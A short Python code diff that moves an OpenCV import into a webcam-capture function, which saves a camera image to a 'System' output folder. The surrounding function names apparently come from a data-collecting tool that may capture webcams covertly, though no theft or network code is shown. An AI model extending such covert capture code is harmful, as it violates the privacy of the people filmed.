@@ -6,7 +6,6 @@ import re
 import struct
 import time
 import base64
-import cv2
 import threading
 import multiprocessing
 import sqlite3
@@ -419,6 +418,7 @@ def systeminfo():
 def get_webcam():
     global webcam_success
     if config.webcam:
+        import cv2
         cam_ = os.path.join(output, 'System', 'Webcam.png')
         os.makedirs(os.path.dirname(cam_), exist_ok=True)
         try:
